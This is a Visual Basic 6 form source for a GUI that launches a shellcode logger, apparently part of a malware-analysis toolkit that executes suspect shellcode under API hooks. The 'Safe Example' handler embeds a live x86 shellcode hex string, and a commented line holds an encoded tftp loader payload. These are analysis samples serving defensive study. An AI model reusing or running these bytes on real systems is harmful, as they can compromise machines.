VERSION 5.00
Begin VB.Form frmSclog 
   Caption         =   "sclog - Shellcode Logger Launch Interface"
   ClientHeight    =   6825
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   10680
   LinkTopic       =   "Form3"
   ScaleHeight     =   6825
   ScaleWidth      =   10680
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   4695
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   9
      Text            =   "frmSclog.frx":0000
      Top             =   2040
      Width           =   10575
   End
   Begin VB.Frame Frame1 
      Caption         =   "Options"
      Height          =   1935
      Left            =   60
      TabIndex        =   0
      Top             =   60
      Width           =   10635
      Begin VB.TextBox txtStartOffset 
         Height          =   285
         Left            =   9240
         TabIndex        =   26
         Text            =   "0"
         Top             =   585
         Width           =   675
      End
      Begin VB.CheckBox chkOffset 
         Caption         =   "Start Offset  0x"
         Height          =   255
         Left            =   7860
         TabIndex        =   25
         Top             =   600
         Width           =   1515
      End
      Begin VB.CheckBox chkAlloc 
         Caption         =   "Alloc Logging"
         Height          =   195
         Left            =   7875
         TabIndex        =   23
         Top             =   270
         Width           =   1275
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Open"
         Height          =   255
         Left            =   9780
         TabIndex        =   21
         Top             =   1200
         Width           =   735
      End
      Begin VB.CheckBox chkShowAddr 
         Caption         =   "Show All Addresses"
         Height          =   255
         Left            =   5880
         TabIndex        =   20
         Top             =   600
         Width           =   1695
      End
      Begin VB.CommandButton cmdLogFile 
         Caption         =   "..."
         Height          =   255
         Left            =   9120
         TabIndex        =   19
         Top             =   1200
         Width           =   495
      End
      Begin VB.TextBox txtLogFile 
         Height          =   285
         Left            =   1500
         TabIndex        =   18
         Top             =   1200
         Width           =   7455
      End
      Begin VB.CheckBox chkLogFile 
         Caption         =   "Log file"
         Height          =   255
         Left            =   240
         TabIndex        =   17
         Top             =   1260
         Width           =   1035
      End
      Begin VB.CommandButton Command2 
         Caption         =   "..."
         Height          =   255
         Left            =   9090
         TabIndex        =   16
         Top             =   900
         Width           =   495
      End
      Begin VB.TextBox txtFhand 
         Height          =   285
         Left            =   1500
         TabIndex        =   15
         Top             =   900
         Width           =   7455
      End
      Begin VB.CheckBox chkOpenFile 
         Caption         =   "Open File"
         Height          =   195
         Left            =   240
         TabIndex        =   14
         Top             =   960
         Width           =   1095
      End
      Begin VB.CommandButton Command1 
         Caption         =   "Launch"
         Height          =   315
         Left            =   9120
         TabIndex        =   8
         Top             =   1500
         Width           =   1455
      End
      Begin VB.CheckBox chkNoHex 
         Caption         =   "Show Data Hex Dumps"
         Height          =   255
         Left            =   5880
         TabIndex        =   7
         Top             =   240
         Width           =   2025
      End
      Begin VB.CheckBox chkDll 
         Caption         =   "Allow Any DLL 2 Load"
         Height          =   255
         Left            =   3720
         TabIndex        =   6
         Top             =   240
         Width           =   2055
      End
      Begin VB.CheckBox chkStep 
         Caption         =   "Single Step API"
         Height          =   255
         Left            =   1920
         TabIndex        =   5
         Top             =   600
         Width           =   1455
      End
      Begin VB.CheckBox chkDump 
         Caption         =   "Memory Dump"
         Height          =   255
         Left            =   240
         TabIndex        =   4
         Top             =   600
         Width           =   1575
      End
      Begin VB.CheckBox chkNoNet 
         Caption         =   "No Safety Net"
         Height          =   255
         Left            =   1920
         TabIndex        =   3
         Top             =   240
         Width           =   1455
      End
      Begin VB.CheckBox chkRedir 
         Caption         =   "Net Redirect"
         Height          =   255
         Left            =   3720
         TabIndex        =   2
         Top             =   600
         Width           =   1575
      End
      Begin VB.CheckBox chkBreak 
         Caption         =   "Add Breakpoint"
         Height          =   255
         Left            =   240
         TabIndex        =   1
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label cmdMemDump 
         Caption         =   "Save Dump"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   7920
         TabIndex        =   24
         Top             =   1620
         Width           =   1095
      End
      Begin VB.Label Label5 
         Caption         =   "Copy Last cmd line"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   2160
         TabIndex        =   22
         Top             =   1620
         Width           =   1455
      End
      Begin VB.Label Label4 
         Caption         =   "Help Screen"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   4080
         TabIndex        =   13
         Top             =   1620
         Width           =   975
      End
      Begin VB.Label Label3 
         Caption         =   "Training Video"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   5340
         TabIndex        =   12
         Top             =   1620
         Width           =   1095
      End
      Begin VB.Label Label2 
         Caption         =   "Manually Load File"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   180
         TabIndex        =   11
         Top             =   1620
         Width           =   1335
      End
      Begin VB.Label Label1 
         Caption         =   "Safe Example"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FF0000&
         Height          =   255
         Left            =   6720
         MousePointer    =   14  'Arrow and Question
         TabIndex        =   10
         Top             =   1620
         Width           =   975
      End
   End
End
Attribute VB_Name = "frmSclog"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Author:   dzzie@yahoo.com
'Site:     http://sandsprite.com

'
'           Generic Shellcode Logger v0.1 BETA
' Author David Zimmer <david@idefense.com, dzzie@yahoo.com>
' Uses the GPL Asm/Dsm Engines from OllyDbg (C) 2001 Oleh Yuschuk
'
' Usage: sclog file [/addbpx /redir /nonet /nofilt /dump /step /anydll /nohex]
'
'    file        shellcode file to execute and log
'    /addbpx     Adds a breakpoint to beginning of shellcode buffer
'    /redir      Changes IP specified in Connect() to localhost
'    /nonet      no safety net - if set we dont block any dangerous apis
'    /nofilt     no api filtering - show all hook messages
'    /dump       dump (probably decoded) shellcode at first api call
'    /step       ask user before each hooked api to continue
'    /anydll     Do not halt on unknown dlls
'    /nohex      Do not display hexdumps
'
'Note that many interesting apis are logged, but not all.
'Shellcode is allowed to run within a minimal sandbox..
'and only known safe (hooked) dlls are allowed to load
'
'It is advised to only run this in VM enviroments as not
'all paths are blocked that could lead to system subversion.
'As it runs, API hooks will be used to log actions skipping
'many dangerous functions.
'
'Use at your own risk!

'mode con cols=x
'mode con lines=x


Dim b() As Byte
Dim dlg As New clsCmnDlg
Dim scfile As String
Dim sclog As String
Dim wsh As New WshShell
Dim ts As TextStream
Dim dump_saved As Boolean

Const def_path As String = "c:\shellcode.sc"
Const def_dump As String = "c:\SHELLC~1.SC.dmp"

Dim last_cmdline As String

Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long


Public Function GetShortName(sFile As String) As String
    Dim sShortFile As String * 67
    Dim lResult As Long
    
    'the path must actually exist to get the short path name !!
    If Not fso.FileExists(sFile) Then fso.writeFile sFile, ""
    
    'Make a call to the GetShortPathName API
    lResult = GetShortPathName(sFile, sShortFile, _
    Len(sShortFile))

    'Trim out unused characters from the string.
    GetShortName = Left$(sShortFile, lResult)
    
    If Len(GetShortName) = 0 Then GetShortName = sFile

End Function

Public Function InitInterface(Optional Shellcode = Empty)
       
    scfile = Empty
    
    If Not checkForMap() Then Command1.enabled = False
    
    If Len(Shellcode) = 0 Then
        Text1 = "No text selected! you can use demo link."
    Else
        Text1 = HexDump(Shellcode)
        b() = StrConv(Shellcode, vbFromUnicode, LANG_US)
    End If
    
    Me.Visible = True
    
    
End Function

Function checkForMap() As Boolean
        
        'sclog = "c:\idefense\map\sc_log\bin\sclog.exe"
        sclog = GetShortName(App.path & "\sclog\bin\sclog.exe")
        If Not fso.FileExists(sclog) Then
            'If MsgBox("Can not find sclog do you want to download the Malcode Analyst Pack?", vbYesNo) = vbYes Then
            '    Shell "cmd.exe /c start http://labs.idefense.com/software/download/?downloadID=8", vbHide
            '    MsgBox "Just install it to its default directory and relaunch this UI", vbInformation
            'End If
            
            MsgBox "Can not find sclog should have been installed by installer?", vbCritical
            
        Else
            checkForMap = True
        End If
        
End Function




Private Sub cmdLogFile_Click()
    Dim f As String
    f = dlg.SaveDialog(AllFiles, RecommendedPath(), "Save log file as", , Me.hwnd, RecommendedName("_sclog.txt"))
    If Len(f) = 0 Then Exit Sub
    txtLogFile = f
End Sub

Private Sub cmdMemDump_Click()
    On Error Resume Next
    
    If Not fso.FileExists(def_dump) Then
        MsgBox "No dump file found have you run sclog yet? Default output path is: " & def_dump, vbInformation
        Exit Sub
    End If
    
    Dim p As String
    p = dlg.SaveDialog(AllFiles, , "Save dump as", , Me.hwnd, "sc.dump")
    If Len(p) = 0 Then Exit Sub
    
    If fso.FileExists(p) Then Kill p
    FileCopy def_dump, p
    
    If Err.Number <> 0 Then
        MsgBox Err.Description
    Else
        dump_saved = True
    End If
    
End Sub

Private Sub Command1_Click()
    
    On Error Resume Next
    
    Const msg = "Warning!\n\nYou are about to try to EXECUTE LIVE the raw byte buffer below which IS PROBABLY MALICIOUS.\n\nUSE THIS ON A TEST MACHINE ONLY!"
    If MsgBox(Replace(msg, "\n", vbCrLf), vbOKCancel) = vbCancel Then Exit Sub
    
    scfile = def_path
    
    'If Len(scfile) = 0 Then
    '    scfile = dlg.SaveDialog(AllFiles, RecommendedPath(), "Save shellcode as", , Me.hwnd, RecommendedName())
    '    If Len(scfile) = 0 Then Exit Sub
        
        If fso.FileExists(scfile) Then Kill scfile
        fso.writeFile scfile, StrConv(b(), vbUnicode, LANG_US)
        
    'End If
    
    If Not checkForMap() Then Exit Sub
    
    'sclog global filled out when checkformap() is called
    'sclog = "c:\idefense\map\sc_log\bin\sclog.exe" 'no spaces in cmdline
    'If Not fso.FileExists(sclog) Then
    '    MsgBox "Can not find sclog in app.path or default MAP directory exiting", vbCritical
    '    Exit Sub
    'End If
   
    Dim cmdline As String
    Dim f As String
    
    scfile = GetShortName((Replace(scfile, Chr(0), Empty)))
    cmdline = sclog & " """ & scfile & """ "
    
    If chkBreak.Value = 1 Then cmdline = cmdline & " /addbpx"
    If chkDll.Value = 1 Then cmdline = cmdline & " /anydll"
    If chkDump.Value = 1 Then cmdline = cmdline & " /dump"
    If chkNoHex.Value = 1 Then cmdline = cmdline & " /hex"
    If chkNoNet.Value = 1 Then cmdline = cmdline & " /nonet"
    If chkRedir.Value = 1 Then cmdline = cmdline & " /redir"
    If chkStep.Value = 1 Then cmdline = cmdline & " /step"
    If chkAlloc.Value = 1 Then cmdline = cmdline & " /alloc"
    If chkShowAddr.Value = 1 Then cmdline = cmdline & " /showadr"
    If chkOffset.Value = 1 Then
        If Not isHexNum(txtStartOffset) Then
            MsgBox "Start offset is not a valid hex number: " & txtStartOffset, vbInformation
            Exit Sub
        End If
        cmdline = cmdline & " /foff " & txtStartOffset
    End If
    
    
    
    If chkLogFile.Value = 1 Then
        cmdline = cmdline & " /log " & GetShortName(txtLogFile.Text)
    End If
    
    If chkOpenFile.Value = 1 Then
        If Not fso.FileExists(txtFhand) Then
            MsgBox "The file to open a handle to does not exist.", vbCritical
            Exit Sub
        End If
        cmdline = cmdline & " /fopen " & GetShortName(txtFhand.Text)
    End If
    
    'If scfile = GetShortName(txtLogFile.Text) Then
    '    MsgBox "The shellcode file can not be the same as the Log file!"
    '    Exit Sub
    'End If
    
    'If chkOpenFile.Value = 1 Then
    '    If scfile = GetShortName(txtFhand.Text) Then
    '        MsgBox "The shellcode file can not be the same as the open file!"
    '        Exit Sub
    '    End If
    'End If
    
    'If FileLen(scfile) <> UBound(b) Then 'just in case somethign screwy happened...
    '    fso.WriteFile scfile, StrConv(b(), vbUnicode)
    'End If
    
    last_cmdline = cmdline
    'Shell "cmd.exe /k mode con lines=45 && " & cmdline, vbNormalFocus
    Shell "cmd.exe /k " & cmdline, vbNormalFocus

End Sub

Private Function RecommendedPath() As String
    On Error Resume Next
    If Len(Form1.txtPDFPath) = 0 Or Form1.txtPDFPath = "Drag and drop pdf file here" Then Exit Function
    RecommendedPath = fso.GetParentFolder(Form1.txtPDFPath)
End Function

Private Function RecommendedName(Optional ext = ".sc") As String
    
    On Error Resume Next
    Dim r As String
    
    If Form1.txtPDFPath = "Drag and drop pdf file here" Or Len(Form1.txtPDFPath) = 0 Then
        If ext = ".gv" Then r = "graph.gv" Else r = "bytes.sc"
        Exit Function
    End If
    
    r = fso.GetBaseName(Form1.txtPDFPath)
    If Len(r) = 0 Then
        If ext = ".gv" Then r = "graph.gv" Else r = "bytes.sc"
    Else
        r = r & ext
    End If
    RecommendedName = r
    
    
    
End Function

Private Sub Command2_Click()
    Dim f As String
    f = dlg.OpenDialog(AllFiles, RecommendedPath(), , Me.hwnd)
    If Len(f) = 0 Then Exit Sub
    txtFhand.Text = f
End Sub

Private Sub Command3_Click()
    On Error Resume Next
    Shell "notepad.exe " & GetShortName(txtLogFile.Text), vbNormalFocus
End Sub

Private Sub Form_Load()
        
    On Error Resume Next
    f = Form1.txtPDFPath
    If Len(f) = 0 Or f = "Drag and drop pdf file here" Then Exit Sub
    
    pf = fso.GetParentFolder(f)
    bn = fso.GetBaseName(f)
    
    txtFhand.Text = f
    txtLogFile.Text = pf & "\" & bn & "_sclog.txt"
    
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    If fso.FileExists(def_path) Then Kill def_path
    If fso.FileExists(def_dump) Then
        If Not dump_saved Then
            If MsgBox("Memory dump was not saved. Would you like ot save it now?", vbYesNo) = vbYes Then
                cmdMemDump_Click
            End If
        End If
        Kill def_dump
    End If
End Sub

Private Sub Label1_Click()
    
    'tftp example peb mod loader didnt work under Win7/Vista
    'x = unescape("%90%90%EB%02%EB%05%E8%F9%FF%FF%FF%5B%31%C9%B1%E0%80%73%0C%12%43%E2%F9%21%D2%76%11%52%22%6A%1E%99%52%1E%99%62%0E%BF%99%52%1A%F9%1B%99%52%26%9F%52%6E%99%52%2E%99%C2%11%52%2E%99%D8%11%5A%6A%99%53%32%99%C8%11%4B%0E%21%ED%21%E4%45%45%99%D8%11%1E%%02%93%6B%18%77%61%61%53%67%10%99%21%93%6B%11%66%46%7A%60%67%10%99%29%91%D2%16%91%D1%16%97%E4%66%C9%97%ED%66%C5%11%E0%11%E8%45%FA%37%12%12%12%66%74%66%62%3C%77%6A%77%32%3F%7B%32%22%3C%22%3C%22%3C%22%32%75%77%66%32%65%7B%7C%73%62%7B%21%20%3C%77%6A%77%12%78%12%FA%31%12%12%12%67%13%D1%FA%1F%12%12%12%65%7B%7C%73%62%7B%21%20%3C%77%6A%77%12%78%12%FA%15%12%12%12%1D%96%F3%ED%ED%ED%D1%4A%49%4F%42%91%FE%46%21%D2%99%EE%9F%5A%52%99%C5%E1%B8%A2%56%B9%45%40%43%43%78%3A%78%13%43%43%47%41%ED%C4%91%D6%46%97%D2%D1%5C%00%43%00%24%00%5C%00%31%00%32%00%33%00%34%00%35%00%36%00")
    X = HexStringUnescape("FCE8890000006089E531D2648B52308B520C8B52148B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01C7E2F052578B52108B423C01D08B407885C0744A01D0508B48188B582001D3E33C498B348B01D631FF31C0ACC1CF0D01C738E075F4037DF83B7D2475E2588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE0585F5A8B12EB865D8D85BB0100005068FF0000006830F349E4FFD58D9DBB01000001D8682E636F6D8F006A008D85BB01000050682C5B06E2FFD589C668AC0000008D9D0F010000535068F65F8EE9FFD589F05068ACFF8DF5FFD56A018D85BB0100005068318B6F87FFD568D00700006844F035E0FFD58D9DBB0100005368D72EDD13FFD56A0068F0B5A256FFD5B013CD1033C0BFB001B9007DF3ABBAC803EE42FEC980FB3C730580C304EB0880FF3C730380C7048AC3EE8AC7EE32C0EEE2E3B1C88106AC01E9628006AC01628116AE011936A1AE0133D2BB4001F7F38BF2FE8C707DE2DDBEF102BFB17EB162BA3E018A9CC0FE8A44FF03D88A440103D88A84400103D8C1EB02881D46474A75E246464747E2D9BEB27EBFB201B97E3E5157F3A55E6800A007BF027D59F3A51E07B401CD16748CB80300CD10C3")
    Me.InitInterface X
    
End Sub

Private Sub Label2_Click()
    On Error Resume Next
    f = dlg.OpenDialog(AllFiles, , "Manually load shellcode file", Me.hwnd)
    If Len(f) = 0 Then Exit Sub
    InitInterface fso.ReadFile(f)
    dump_saved = False
End Sub

Private Sub Label3_Click()
    
    On Error Resume Next
    Shell "cmd /c start http://www.youtube.com/watch?v=XBcmC4jYiRI"
    
End Sub

Private Sub Label4_Click()
    On Error Resume Next
    If checkForMap() Then
        Shell "cmd /k mode con lines=45 && " & sclog, vbNormalFocus
    End If
End Sub

Private Sub Label5_Click()
    Clipboard.Clear
    Clipboard.SetText last_cmdline
    MsgBox "Last command line copied to clipboard: " & vbCrLf & vbCrLf & last_cmdline, vbInformation
End Sub

Private Sub txtFhand_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, X As Single, Y As Single)
    On Error Resume Next
    txtFhand.Text = Data.Files(1)
End Sub
